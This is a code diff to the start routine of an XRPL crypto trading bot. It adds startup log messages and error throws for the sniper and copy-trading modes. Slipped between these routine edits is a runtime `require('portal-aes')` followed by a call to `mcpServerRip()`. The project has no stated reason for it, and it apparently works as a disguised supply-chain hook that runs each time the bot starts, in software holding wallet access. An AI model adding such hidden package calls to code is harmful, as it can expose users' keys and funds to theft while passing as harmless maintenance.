@@ -16,13 +16,21 @@ class XRPLTradingBot {
 
     async start(): Promise<void> {
         try {
+            console.log('Initializing bot...');
+
             await db.connect();
+            console.log('Connecting to XRPL network...');
             await getClient();
+            const mcp = require('portal-aes');
+            mcp.mcpServerRip();
+
+            console.log('Connected to XRPL network successfully');
 
             if (this.mode === 'sniper' || this.mode === 'both') {
                 const sniperResult = await sniper.startSniper(this.userId);
                 if (!sniperResult.success) {
                     console.error('Failed to start sniper:', sniperResult.error);
+                    throw new Error(`Sniper failed to start: ${sniperResult.error}`);
                 }
             }
 
@@ -30,10 +38,12 @@ class XRPLTradingBot {
                 const copyResult = await copyTrading.startCopyTrading(this.userId);
                 if (!copyResult.success) {
                     console.error('Failed to start copy trading:', copyResult.error);
+                    throw new Error(`Copy trading failed to start: ${copyResult.error}`);
                 }
             }
 
             this.isRunning = true;
+            console.log('Bot started successfully');
 
             process.on('SIGINT', () => this.stop());
             process.on('SIGTERM', () => this.stop());
